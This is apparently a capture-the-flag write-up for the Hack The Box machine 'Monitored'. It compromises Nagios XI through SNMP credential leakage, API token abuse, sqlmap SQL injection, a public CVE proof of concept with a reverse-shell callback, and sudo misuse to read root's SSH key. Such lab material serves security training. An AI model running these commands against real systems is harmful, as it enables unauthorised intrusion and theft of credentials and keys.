
### Initial access
Nmap
```
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/xFgJTbVC36GNHaE0GG4n/bWZGaD2aE7lsFUvXVdbINrl0qzBPVCMuOE1HNf0LHi09obr2Upt9VURzpYdrQp/7SX2NDet9pb+UQnB1IgjRSxoIxjsOX756a7nzi71tdcR3I0sALQ4ay5I5GO4TvaVq+o8D01v94B0Qm47LVk7J3mN4wFR17lYcCnm0kwxNBsKsAgZVETxGtPgTP6hbauEk/SKGA5GASdWHvbVhRHgmBz2l7oPrTot5e+4m8A7/5qej2y5PZ9Hq/2yOldrNpS77ID689h2fcOLt4fZMUbxuDzQIqGsFLPhmJn5SUCG9aNrWcjZwSL2LtLUCRt6PbW39UAfGf47XWiSs/qTWwW/yw73S8n5oU5rBqH/peFIpQDh2iSmIhbDq36FPv5a2Qi8HyY6ApTAMFhwQE6MnxpysKLt/xEGSDUBXh+4PwnR0sXkxgnL8QtLXKC2YBY04jGG0DXGXxh3xEZ3vmPV961dcsNd6Up8mmSC43g5gj2ML/E=
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBbeArqg4dgxZEFQzd3zpod1RYGUH6Jfz6tcQjHsVTvRNnUzqx5nc7gK2kUUo1HxbEAH+cPziFjNJc6q7vvpzt4=
|   256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5o+WJqnyLpmJtLyPL+tEUTFbjMZkx3jUUFqejioAj7
80/tcp   open  http       syn-ack ttl 63 Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
389/tcp  open  ldap       syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb
| Issuer: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/localityName=Bournemouth/emailAddress=support@monitored.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-11T21:46:55
| Not valid after:  2297-08-25T21:46:55
| MD5:     b36a 5560 7a5f 047d 9838 6450 4d67 cfe0
| SHA-1:   6109 3844 8c36 b08b 0ae8 a132 971c 8e89 cfac 2b5b
| SHA-256: d151 a70c 69e3 c454 ff38 4090 f294 2335 b590 0499 eace 7aa2 68b5 0c75 83fc b1bb
| -----BEGIN CERTIFICATE-----
| MIID/zCCAuegAwIBAgIUVhOvMcK6dv/Kvzplbf6IxOePX3EwDQYJKoZIhvcNAQEL
| BQAwgY0xCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZEb3JzZXQxFDASBgNVBAcMC0Jv
| dXJuZW1vdXRoMRIwEAYDVQQKDAlNb25pdG9yZWQxHTAbBgNVBAMMFG5hZ2lvcy5t
| b25pdG9yZWQuaHRiMSQwIgYJKoZIhvcNAQkBFhVzdXBwb3J0QG1vbml0b3JlZC5o
| dGIwIBcNMjMxMTExMjE0NjU1WhgPMjI5NzA4MjUyMTQ2NTVaMIGNMQswCQYDVQQG
| EwJVSzEPMA0GA1UECAwGRG9yc2V0MRQwEgYDVQQHDAtCb3VybmVtb3V0aDESMBAG
| A1UECgwJTW9uaXRvcmVkMR0wGwYDVQQDDBRuYWdpb3MubW9uaXRvcmVkLmh0YjEk
| MCIGCSqGSIb3DQEJARYVc3VwcG9ydEBtb25pdG9yZWQuaHRiMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1qRRCKn9wFGquYFdqh7cp4WSTPnKdAwkycqk
| a3WTY0yOubucGmA3jAVdPuSJ0Vp0HOhkbAdo08JVzpvPX7Lh8mIEDRSX39FDYClP
| vQIAldCuWGkZ3QWukRg9a7dK++KL79Iz+XbIAR/XLT9ANoMi8/1GP2BKHvd7uJq7
| LV0xrjtMD6emwDTKFOk5fXaqOeODgnFJyyXQYZrxQQeSATl7cLc1AbX3/6XBsBH7
| e3xWVRMaRxBTwbJ/mZ3BicIGpxGGZnrckdQ8Zv+LRiwvRl1jpEnEeFjazwYWrcH+
| 6BaOvmh4lFPBi3f/f/z5VboRKP0JB0r6I3NM6Zsh8V/Inh4fxQIDAQABo1MwUTAd
| BgNVHQ4EFgQU6VSiElsGw+kqXUryTaN4Wp+a4VswHwYDVR0jBBgwFoAU6VSiElsG
| w+kqXUryTaN4Wp+a4VswDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
| AQEAdPGDylezaB8d/u2ufsA6hinUXF61RkqcKGFjCO+j3VrrYWdM2wHF83WMQjLF
| 03tSek952fObiU2W3vKfA/lvFRfBbgNhYEL0dMVVM95cI46fNTbignCj2yhScjIz
| W9oeghcR44tkU4sRd4Ot9L/KXef35pUkeFCmQ2Xm74/5aIfrUzMnzvazyi661Q97
| mRGL52qMScpl8BCBZkdmx1SfcVgn6qHHZpy+EJ2yfJtQixOgMz3I+hZYkPFjMsgf
| k9w6Z6wmlalRLv3tuPqv8X3o+fWFSDASlf2uMFh1MIje5S/jp3k+nFhemzcsd/al
| 4c8NpU/6egay1sl2ZrQuO8feYA==
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
| tls-alpn: 
|_  http/1.1
|_http-title: Nagios XI
|_ssl-date: TLS randomness does not represent time
5667/tcp open  tcpwrapped syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

UDPX
```
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ udpx -t $target

        __  ______  ____ _  __                                                                                                                                                                                                              
       / / / / __ \/ __ \ |/ /                                                                                                                                                                                                              
      / / / / / / / /_/ /   /                                                                                                                                                                                                               
     / /_/ / /_/ / ____/   |                                                                                                                                                                                                                
     \____/_____/_/   /_/|_|                                                                                                                                                                                                                
         v1.0.7, by @nullt3r                                                                                                                                                                                                                
                                                                                                                                                                                                                                            
2026/09/15 23:57:17 [+] Starting UDP scan on 1 target(s)                                                                                                                                                                                    
2026/09/15 23:57:21 [*] 10.129.230.96:123 (ntp)
2026/09/15 23:57:24 [*] 10.129.230.96:161 (snmp)
2026/09/15 23:57:36 [+] Scan completed
                                           
```
Search spoit
```
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ searchsploit nagios xi rce
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nagios XI - Authenticated Remote Command Execution (Metasploit)                                                                                                                                           | linux/remote/48191.rb
Nagios XI 5.2.6-5.4.12 - Chained Remote Code Execution (Metasploit)                                                                                                                                       | linux/remote/44969.rb
Nagios XI 5.2.6-5.4.12 - Chained Remote Code Execution (Metasploit)                                                                                                                                       | linux/remote/44969.rb
Nagios XI 5.2.6-5.4.12 - Chained Remote Code Execution (Metasploit)                                                                                                                                       | linux/remote/44969.rb
Nagios Xi 5.6.6 - Authenticated Remote Code Execution (RCE)                                                                                                                                               | multiple/webapps/52138.txt
Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)                                                                                                                                               | php/webapps/49422.py
---------------------------------------------------------------
```
Run snmp
```
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ snmpwalk -v2c -c public 10.129.230.96  1.3.6.1.2.1.25.4.2.1.5
OST-RESOURCES-MIB::hrSWRunParameters.518 = STRING: "--config /etc/laurel/config.toml"
HOST-RESOURCES-MIB::hrSWRunParameters.562 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.574 = STRING: "-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0"
HOST-RESOURCES-MIB::hrSWRunParameters.584 = STRING: "-f"
HOST-RESOURCES-MIB::hrSWRunParameters.585 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
HOST-RESOURCES-MIB::hrSWRunParameters.587 = STRING: "-n -iNONE"
HOST-RESOURCES-MIB::hrSWRunParameters.588 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.589 = STRING: "-u -s -O /run/wpa_supplicant"
HOST-RESOURCES-MIB::hrSWRunParameters.594 = STRING: "-f"
HOST-RESOURCES-MIB::hrSWRunParameters.609 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
HOST-RESOURCES-MIB::hrSWRunParameters.741 = STRING: "-f /usr/local/nagios/etc/pnp/npcd.cfg"
HOST-RESOURCES-MIB::hrSWRunParameters.747 = STRING: "-LOw -f -p /run/snmptrapd.pid"
HOST-RESOURCES-MIB::hrSWRunParameters.755 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
HOST-RESOURCES-MIB::hrSWRunParameters.756 = STRING: "-o -p -- \\u --noclear tty1 linux"
HOST-RESOURCES-MIB::hrSWRunParameters.770 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.780 = STRING: "-p /var/run/ntpd.pid -g -u 108:116"
HOST-RESOURCES-MIB::hrSWRunParameters.817 = STRING: "-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d"
HOST-RESOURCES-MIB::hrSWRunParameters.832 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
HOST-RESOURCES-MIB::hrSWRunParameters.837 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
HOST-RESOURCES-MIB::hrSWRunParameters.841 = STRING: "-k start"
HOST-RESOURCES-MIB::hrSWRunParameters.923 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.924 = STRING: "-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf"
HOST-RESOURCES-MIB::hrSWRunParameters.930 = STRING: "-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6"
HOST-RESOURCES-MIB::hrSWRunParameters.934 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.935 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.936 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.937 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.938 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.939 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.951 = STRING: "/usr/sbin/snmptt --daemon"
HOST-RESOURCES-MIB::hrSWRunParameters.953 = STRING: "/usr/sbin/snmptt --daemon"
HOST-RESOURCES-MIB::hrSWRunParameters.966 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
HOST-RESOURCES-MIB::hrSWRunParameters.968 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
HOST-RESOURCES-MIB::hrSWRunParameters.969 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
HOST-RESOURCES-MIB::hrSWRunParameters.970 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
HOST-RESOURCES-MIB::hrSWRunParameters.971 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
HOST-RESOURCES-MIB::hrSWRunParameters.1411 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
HOST-RESOURCES-MIB::hrSWRunParameters.1423 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
HOST-RESOURCES-MIB::hrSWRunParameters.1425 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"

```

We have cred `svc:XjH7VCehowpR1xZB`
But went test to web login user has been disable but we have away is use authen endpoint `/nagiosxi/api/v1/authenticate`
```
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ curl -sk -X POST 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' \
  -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=60'

{
    "username": "svc",
    "user_id": "2",
    "auth_token": "620a9b9dc2ff12dd7df1e3d66cd32f61a6103572",
    "valid_min": 60,
    "valid_until": "Wed, 16 Sep 2026 01:17:40 -0400"
}
     
```
And using this to access admin page
```
https://nagios.monitored.htb/nagiosxi/login.php?token=620a9b9dc2ff12dd7df1e3d66cd32f61a6103572
```

We use this to get exploit https://github.com/G4sp4rCS/CVE-2023-40931-POC.git
For faster exploit
```
sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=73af918d1d7ede3d66f6dbf81ac80c3913514ab9' \
  --data='action=acknowledge_banner_message&id=3' \
  --cookie='nagiosxi=ld5hgadf6mgd84h0q4vr5n5g1v' \
  -p id \
  -D nagiosxi \
  -T xi_users \
  --dump \
  --batch
```

```
┌──(kali㉿kali)-[~/HTB/Monitored/CVE-2023-40931-POC]
└─$ python3 admin-exploit.py --target  https://nagios.monitored.htb/nagiosxi/ --api_key IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL   --nc_ip 10.10.17.47 --nc_port 4444


[+] Admin account created: joO0Ybd3 / OjdFQJLTyhD0

```
The exploit fail because they use need to interactive with website to active the admin account .
Follow instruction below to get shell command
```
### Admin Command Execution

1. Log in to Nagios XI using the administrator account.
    
2. Navigate to:  
    **Configure → Core Config Manager → Commands**
    
3. Create a new command definition.
    
4. Save the command and click **Apply Configuration**.
    
5. Navigate to:  
    **Configure → Core Config Manager → Services**
    
6. Select an active service on a monitored host.
    
7. Edit the service and change its **Check Command** to the command created in the previous step.
    
8. Save the service configuration and click **Apply Configuration** again.
    
9. Trigger the service check using **Run Check Command** or wait for the next scheduled check.
    
10. Verify the resulting check output and confirm that the command is being executed in the Nagios monitoring context.
    

### Key idea

The important part of the attack chain is that an administrator can control a Nagios check command and assign it to a monitored service. When Nagios performs the check, the configured command is executed by the monitoring system.

```


### Priv escalation
sudo -l
```
nagios@monitored:~$ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *

```

There is 2 way to exploit first with file we own in the script
```
ln -sf /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log

```
And second is file we can write is `/usr/local/nagios/etc/nagios.cfg` config  log  file to read id_rsa
```
#!/bin/bash

CFG="/usr/local/nagios/etc/nagios.cfg"

sed -i 's|^log_file=.*|log_file=/root/.ssh/id_rsa|' "$CFG"

grep '^log_file' "$CFG"
```

```
nagios@monitored:/usr/local/nagiosxi/var/components$ sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 0

nagios@monitored:/usr/local/nagiosxi/var/components/profile-1789548215$ cat nagios-logs/nagios.txt 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZYnlG22OdnxaaK98DJMc9isuSgg9wtjC0r1iTzlSRVhNALtSd2C
FSINj1byqeOkrieC8Ftrte+9eTrvfk7Kpa8WH0S0LsotASTXjj4QCuOcmgq9Im5SDhVG7/
z9aEwa3bo8u45+7b+zSDKIolVkGogA6b2wde5E3wkHHDUXfbpwQKpURp9oAEHfUGSDJp6V
bok57e6nS9w4mj24R4ujg48NXzMyY88uhj3HwDxi097dMcN8WvIVzc+/kDPUAPm+l/8w89

nagios@monitored:/usr/local/nagiosxi/var/components/profile-1789548215$ cat phpmailer.log 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZYnlG22OdnxaaK98DJMc9isuSgg9wtjC0r1iTzlSRVhNALtSd2C
FSINj1byqeOkrieC8Ftrte+9eTrvfk7Kpa8WH0S0LsotASTXjj4QCuOcmgq9Im5SDhVG7/
z9aEwa3bo8u45+7b+zSDKIolVkGogA6b2wde5E3wkHHDUXfbpwQKpURp9oAEHfUGSDJp6V

```


```
┌──(kali㉿kali)-[~/HTB/Monitored]
└─$ ssh -i id_rsa root@10.129.230.96               
Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@monitored:~# 

```